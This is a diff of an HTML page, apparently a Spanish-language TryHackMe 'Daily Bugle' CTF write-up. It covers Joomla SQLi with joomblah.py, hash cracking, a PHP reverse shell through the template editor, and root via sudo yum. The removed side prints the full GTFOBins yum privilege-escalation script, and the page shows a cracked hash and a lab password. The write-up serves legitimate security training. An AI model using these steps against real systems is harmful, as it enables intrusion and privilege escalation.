@@ -16,126 +16,90 @@
       <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
     </div>
   </nav>
-
   <main class="container py-5 mt-5">
     <div class="writeup-header p-4 rounded mb-4">
       <div class="d-flex flex-wrap gap-2 mb-3">
         <span class="badge bg-info text-dark fs-6">TryHackMe</span>
-        <span class="badge bg-danger fs-6">Hard</span>
+        <span class="badge bg-success fs-6">Hard</span>
         <span class="badge bg-secondary">Linux</span>
         <span class="badge bg-secondary">Joomla</span>
         <span class="badge bg-secondary">SQLi</span>
+        <span class="badge bg-secondary">PHP</span>
+        <span class="badge bg-secondary">sudo yum</span>
       </div>
       <h1 class="text-white fw-bold mb-1">Daily Bugle</h1>
-      <p class="text-secondary mb-3">SQLi en Joomla 3.7.0 con joomblah.py para extraer credenciales, acceso al panel admin y reverse shell via template PHP. Escalada con sudo yum.</p>
+      <p class="text-secondary mb-3">Joomla 3.7.0 SQLi via joomblah.py; hash crackeable con john; reverse shell via template; escalada con sudo yum.</p>
       <div class="d-flex flex-wrap gap-3 text-secondary small">
-        <span><i class="bi bi-calendar3"></i> Jun 2023</span>
-        <span><i class="bi bi-clock"></i> ~60 min</span>
         <span><i class="bi bi-person"></i> cat4clysm</span>
       </div>
     </div>
-
     <div class="mb-4">
       <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
       <div class="d-flex flex-wrap gap-2">
         <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">wfuzz</span>
         <span class="badge bg-dark border border-secondary p-2">joomblah.py</span>
         <span class="badge bg-dark border border-secondary p-2">john</span>
         <span class="badge bg-dark border border-secondary p-2">netcat</span>
       </div>
     </div>
-
-    <section class="mb-5">
-      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
       <div class="code-block mb-3">
         <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code>nmap -p22,80,3306 -sC -sV 10.10.106.212</code></pre>
-      </div>
-      <div class="code-block mb-3">
-        <pre><code>80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/5.6.40
-|_http-generator: Joomla!
-3306/tcp open  mysql   MariaDB (unauthorized)</code></pre>
-      </div>
-      <p class="text-secondary">El sitio corre <span class="text-warning">Joomla</span>. Revisando <code>/robots.txt</code> encontramos la ruta <code>/administrator/</code>. La versión de Joomla es <span class="text-danger">3.7.0</span>, vulnerable a SQLi.</p>
-      <div class="alert-custom p-3 rounded">
-        <i class="bi bi-exclamation-triangle text-warning me-2"></i>
-        <span class="text-warning">CVE-2017-8917</span> — SQL injection en Joomla 3.7.0 a través del componente <code>com_fields</code>.
+        <pre><code>nmap -sC -sV -p 22,80,3306 10.10.116.241 -oN targeted</code></pre>
       </div>
     </section>
-
     <section class="mb-5">
-      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> Explotación — SQL Injection</h4>
-      <p class="text-secondary">Usamos <code>joomblah.py</code>, exploit público que automatiza la extracción de credenciales:</p>
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-database"></i> Joomla 3.7.0 - SQLi</h4>
       <div class="code-block mb-3">
         <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code>python3 joomblah.py http://10.10.106.212</code></pre>
-      </div>
-      <div class="code-block mb-3">
-        <pre><code>[-] Fetching CSRF token
-[-] Testing SQLi
-[+] Found user: jonah
-[+] Hash: $2y$10$hash...</code></pre>
-      </div>
-      <p class="text-secondary">Crackeamos el hash bcrypt con John:</p>
+        <pre><code>wfuzz -c --hc 404,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.116.241/FUZZ -t 200</code></pre>
+      </div><img src="img/thm-dailybugle/0410020236.png" class="img-fluid rounded mb-3 border border-secondary" alt="wfuzz">
+      <p class="text-secondary">Version Joomla: <code>http://10.10.116.241/administrator/manifests/files/joomla.xml</code></p>
+      <img src="img/thm-dailybugle/0410020237.png" class="img-fluid rounded mb-3 border border-secondary" alt="joomla version">
       <div class="code-block mb-3">
         <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
-      </div>
+        <pre><code>python2 joomblah.py http://10.10.116.241/</code></pre>
+      </div><img src="img/thm-dailybugle/0410020256.png" class="img-fluid rounded mb-3 border border-secondary" alt="joomblah">
+      <p class="text-secondary">Hash obtenido: <code>$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></p>
       <div class="code-block mb-3">
-        <pre><code>spiderman123     (jonah)</code></pre>
-      </div>
-      <p class="text-secondary">Accedemos al panel admin y modificamos un template PHP para obtener reverse shell.</p>
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+john hash --show</code></pre>
+      </div><img src="img/thm-dailybugle/0410030318.png" class="img-fluid rounded mb-3 border border-secondary" alt="john cracked">
+      
     </section>
-
     <section class="mb-5">
-      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada de privilegios</h4>
-      <p class="text-secondary">Como <code>www-data</code> encontramos credenciales en <code>configuration.php</code> de Joomla. El usuario <code>jjameson</code> reutiliza la contraseña. Escalamos a root con sudo:</p>
-      <div class="code-block mb-3">
-        <pre><code>sudo -l
-(root) NOPASSWD: /usr/bin/yum</code></pre>
-      </div>
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Reverse Shell via Template Editor</h4>
+      <p class="text-secondary">Entramos al admin y vamos a Extensions > Templates > Templates. Editamos error.php con reverse shell PHP:</p>
       <div class="code-block mb-3">
         <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code># GTFOBins - yum privesc
-TF=$(mktemp -d)
-cat >$TF/x<<EOF
-[main]
-plugins=1
-pluginpath=$TF
-pluginconfpath=$TF
-EOF
-cat >$TF/y.conf<<EOF
-[main]
-enabled=1
-EOF
-cat >$TF/y.py<<EOF
-import os
-import yum
-from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
-requires_api_version='2.1'
-def init_hook(conduit):
-  os.execl('/bin/sh','/bin/sh')
-EOF
-sudo yum -c $TF/x --enableplugin=y</code></pre>
-      </div>
-      <div class="code-block">
-        <pre><code>sh-4.2# whoami
-<span class="text-danger fw-bold">root</span></code></pre>
-      </div>
+        <pre><code>cp /usr/share/laudanum/wordpress/templates/php-reverse-shell.php .</code></pre>
+      </div><p class="text-secondary">Accedemos a <code>http://10.10.116.241/templates/beez3/error.php</code> con nc escuchando.</p>
+      <img src="img/thm-dailybugle/0410030334.png" class="img-fluid rounded mb-3 border border-secondary" alt="template editor">
+      <img src="img/thm-dailybugle/0410030358.png" class="img-fluid rounded mb-3 border border-secondary" alt="shell">
+      
     </section>
-
     <section class="mb-5">
-      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
-      <ul class="text-secondary">
-        <li>Joomla 3.7.0 es vulnerable a SQLi crítico sin autenticación — siempre verificar la versión del CMS.</li>
-        <li>Las credenciales de la base de datos en CMS frecuentemente son reutilizadas por usuarios del sistema.</li>
-        <li>GTFOBins es esencial para escalar con binarios permitidos en sudo.</li>
-      </ul>
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada - yum sudo</h4>
+      <p class="text-secondary">En /var/www/html/configuration.php encontramos la clave <code>nv5uz9r3ZEDzVjNu</code>.</p>
+      <img src="img/thm-dailybugle/0410040417.png" class="img-fluid rounded mb-3 border border-secondary" alt="config.php">
+      <p class="text-secondary">El usuario jjameson usa esta contrasena. Con sudo yum escalamos:</p>
+      <img src="img/thm-dailybugle/0410040404.png" class="img-fluid rounded mb-3 border border-secondary" alt="sudo -l">
+      <img src="img/thm-dailybugle/0410040441.png" class="img-fluid rounded mb-3 border border-secondary" alt="gtfobins yum">
+      <img src="img/thm-dailybugle/0410040420.png" class="img-fluid rounded mb-3 border border-secondary" alt="root">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>Joomla 3.7.0 tiene una SQLi critica explotable con joomblah.py sin necesidad de sqlmap.</li>
+<li>Los archivos de configuracion de CMS contienen contrasenas de base de datos reutilizadas.</li>
+<li>sudo yum en GTFOBins permite escalar privilegios creando una shell interactiva.</li></ul>
     </section>
   </main>
-
   <footer class="py-4 text-center border-top border-secondary">
-    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
   </footer>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
